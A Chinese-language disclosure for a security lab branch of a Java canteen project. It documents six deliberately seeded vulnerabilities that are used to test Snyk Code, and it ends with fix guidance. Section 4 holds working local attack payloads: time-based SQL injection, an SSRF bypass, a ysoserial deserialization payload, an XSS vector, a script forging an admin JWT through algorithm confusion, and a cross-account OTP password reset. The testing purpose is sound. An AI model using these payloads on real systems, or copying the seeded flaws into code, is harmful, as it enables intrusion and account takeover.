# SEC-LAB：种子漏洞说明

> 本文件用于实验披露。`security-lab` 分支中的 A1–A4、B1–B2 是**人为注入的种子漏洞**，不是原始项目扫描发现的问题。
> 不要把它们混入原始 `main` 的基线统计，也不要在报告中写成“Snyk 在原始代码中检出”。

## 1. 分支与基线

- 基线：`main` @ `5a37f99`（仅比 `8948412` 多一个 `.snyk` 排除配置）
- 种子分支：`security-lab`
- `.snyk` 排除了 `env/venv` 和 `target`，没有排除 `src/main`

## 2. 注入清单

| 编号 | 类型 | 入口 | 关键 sink | 主要文件 |
| --- | --- | --- | --- | --- |
| A1 | SQL 注入 | `GET /api/finances/report?sort=...&order=...` | `JdbcTemplate.queryForList(sql)` | `FinanceReportController` → `FinanceReportService` → `FinanceReportDao` |
| A2 | SSRF | `POST /accounts/avatar/import` | `OkHttp Request.Builder().url(userUrl)` | `AccountController` → `RemoteAvatarService` |
| A3 | 反序列化 | `POST /orderInfos/snapshot/restore` | `ObjectInputStream.readObject()` | `OrderSnapshotController` → `OrderSnapshotService` |
| A4 | XSS（模板） | `GET /reviews/view?text=...` | Thymeleaf `th:utext` | `ReviewPageController` → `templates/review.html` |
| B1 | JWT 算法混淆 | 任意带 `Authorization` 的接口 | `JWT.decode` + HS256 回退到 RSA 公钥 | `JWTUtils.verifyFlexible`、`JWTInterceptors` |
| B2 | OTP 重置链 | `POST /accounts/otp/send`、`/accounts/otp/verify` | `OTP_BY_CODE.get(code)` + `&&` 绑定判断 + `changePassword` | `OtpService`、`AccountController` |

代码中以 `SEC-LAB-A1`...`SEC-LAB-B2` 注释标记。

## 3. 本地扫描

前提：Snyk Code 已在你当前 Organization 启用（若报 `SNYK-CODE-0005`，先执行 `Settings → Snyk Code → Enable`）。

```bash
cd Elderly-Canteen-Java
git rev-parse HEAD > ../snyk-results/seed-commit.txt

snyk code test --org=YOUR_ORG_ID \
  --json-file-output=../snyk-results/seed.json \
  > ../snyk-results/seed.log 2>&1
echo $? > ../snyk-results/seed-exit-code.txt
cat ../snyk-results/seed.log
```

说明：

- `snyk code test` 只读源码，不需要启动 Spring Boot、不需要数据库/MinIO。
- 没有告警时可能不生成 JSON 文件，必须保留 `seed.log` 和退出码。
- CLI 的 `Info` 就是 Data Flow；想看可视化 Data Flow，可在 Web UI 用 `--report`，或用 VS Code 的 Snyk 扩展。
- 预期 A1–A4 更可能被识别；B1/B2 可能只命中部分规则或完全漏报，这本身就是实验结论的一部分。

## 4. 验证用例（仅本地）

以下命令假设服务运行在 `http://127.0.0.1:8080`，并使用测试数据。不要把真实凭据带进请求或截图。

### A1 SQL 注入

```bash
curl -s 'http://127.0.0.1:8080/api/finances/report?sort=financeDate,(SELECT%20IF(1=1,SLEEP(5),0))&order=asc'
```

预期：响应明显延迟；正常请求 `sort=financeDate` 不应延迟。

### A2 SSRF

```bash
# 起一个本地“内网”服务
python3 -m http.server 8081 --bind 127.0.0.1

# 用登录得到的 token 导入头像
curl -s -X POST 'http://127.0.0.1:8080/accounts/avatar/import' \
  -H 'Authorization: Bearer <TOKEN>' \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://127.1:8081/secret.txt"}'
```

绕过点：`127.1` 不在精确黑名单里；OkHttp 默认跟随重定向。

### A3 反序列化

```bash
# 仅本地实验：用 ysoserial 的 URLDNS 生成 payload
java -jar ysoserial.jar URLDNS http://127.0.0.1:9999 > /tmp/urldns.bin
base64 < /tmp/urldns.bin | tr -d '\n' > /tmp/urldns.b64

curl -s -X POST 'http://127.0.0.1:8080/orderInfos/snapshot/restore' \
  -H 'Content-Type: application/json' \
  -d "{\"snapshot\":\"$(cat /tmp/urldns.b64)\"}"
```

预期：本地 DNS/HTTP 监听端收到请求，说明 `readObject` 执行；黑名单只拦 `Runtime/ProcessBuilder`。

### A4 模板 XSS

```bash
curl -s 'http://127.0.0.1:8080/reviews/view?text=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E'
```

预期：页面直接渲染 `<img ...>`，而不是转义后的文本。

### B1 JWT 算法混淆

```bash
# 取公钥
curl -s 'http://127.0.0.1:8080/accounts/publicKey'
```

用公钥 DER 字节作为 HMAC key，伪造 `alg=HS256` 的 token：

```python
import base64, hashlib, hmac, json, time, urllib.request

pem = urllib.request.urlopen("http://127.0.0.1:8080/accounts/publicKey").read()
pem = json.loads(pem)["publicKey"]
der = base64.b64decode("".join(pem.splitlines()[1:-1]))

def b64(b):
    return base64.urlsafe_b64encode(b).rstrip(b"=")

header = b64(json.dumps({"alg":"HS256","typ":"JWT"}).encode())
payload = b64(json.dumps({
    "accountId": "1",
    "accountname": "admin",
    "identity": "admin",
    "exp": int(time.time()) + 3600
}).encode())
sig = b64(hmac.new(der, header + b"." + payload, hashlib.sha256).digest())
print((header + b"." + payload + b"." + sig).decode())
```

拿伪造 token 调 `GET /accounts/getPersonInfo` 或 `POST /accounts/changePassword?password=...`。不要对真实账号执行。

### B2 OTP 跨账号重置

```bash
# 1. 攻击者用自己的手机号拿 code（实验环境会在服务端控制台打印 [OTP]）
curl -s -X POST 'http://127.0.0.1:8080/accounts/otp/send' \
  -H 'Content-Type: application/json' \
  -d '{"phoneNum":"<ATTACKER_PHONE>"}'

# 2. 用攻击者的 code + 受害者 phoneNum + 攻击者 newPhoneNum
curl -s -X POST 'http://127.0.0.1:8080/accounts/otp/verify' \
  -H 'Content-Type: application/json' \
  -d '{"phoneNum":"<VICTIM_PHONE>","code":"<CODE>","newPhoneNum":"<ATTACKER_PHONE>","newPassword":"NewPass1"}'
```

预期：受害者密码被重置；同一 code 还可重复使用。

## 5. 修复提示

- A1：`sort` 用 enum/Map 映射到固定列名，值用 `?` 绑定；不要拼接 `ORDER BY`。
- A2：域名 allowlist；解析所有 A/AAAA 并拒绝 loopback/private/link-local/metadata；固定解析结果；禁止或逐跳校验重定向。
- A3：不要反序列化不可信数据；改用 JSON DTO；必须用时使用 `ObjectInputFilter` 白名单。
- A4：把 `th:utext` 改成 `th:text`，或使用富文本 sanitizer。
- B1：不要从 token header 选算法；RSA 场景只接受 RS256；不要用公钥字节做 HMAC。
- B2：`SecureRandom`；按 `(phone, purpose)` 绑定；常量时间比较；单次使用；限速/限次；改密后吊销旧 token。

## 6. 注意

- 这是实验种子，不要部署公网。
- 仓库是 public；原有 `JWTUtils`/`AudioService` 中的硬编码值如果真实有效，请轮换。
- 报告里用 `SEED-A1`...`SEED-B2` 单列，并附 `security-lab` 的 commit/diff。
